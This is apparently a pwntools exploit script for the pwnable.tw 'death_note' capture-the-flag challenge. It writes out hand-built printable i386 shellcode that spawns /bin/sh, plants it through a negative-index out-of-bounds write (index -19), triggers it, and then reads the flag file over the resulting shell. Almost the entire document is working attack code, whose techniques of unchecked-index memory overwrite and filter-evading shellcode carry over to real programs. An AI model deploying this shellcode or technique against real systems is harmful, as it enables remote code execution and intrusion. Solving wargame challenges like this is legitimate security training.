#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 10201
HOST = "chall.pwnable.tw"
exe = context.binary = ELF('./death_note', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b* 0x80488eb
        	b* 0x08048873
        	b* 0x080487D3
        	b* 0x080487C0
        	b* 0x08048713
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add(idx, data):
	p.sendafter(b'choice :', str(1))
	p.sendafter(b'Index :', str(idx))
	p.sendafter(b'Name :', data)

def show(idx):
	p.sendafter(b'choice :', str(2))
	p.sendafter(b'Index :', str(idx))

def delete(idx):
	p.sendafter(b'choice :', str(3))
	p.sendafter(b'Index :', str(idx))

# VARIABLE


# PAYLOAD
shellcode = asm('''
	push ecx
    push 1752379183
	push 1852400175
	push esp
	pop ebx

	push eax
	pop esp
	dec ecx
	push ecx
	pop eax
	xor ax, 0x2040
	xor ax, 0x5f72
	xor byte ptr [esp + 0x3a], al
	xor byte ptr [esp + 0x3b], ah
	push edx
	pop ecx

	push 0x20
	pop eax
	xor al, 0x20
	inc eax
	inc eax
	inc eax
	inc eax
	inc eax
	inc eax
	inc eax
	inc eax
	inc eax
	inc eax
	inc eax

	inc eax
	dec eax
	inc eax
	dec eax
	inc eax
	dec eax
    ''', arch='i386')
print(hex(len(shellcode)))
add(-19, shellcode)
# GDB()
delete(-19)
# call (int)mprotect(heap_base, 0x22000, 7)
p.sendline(b'cat /home/death_note/flag')

p.interactive()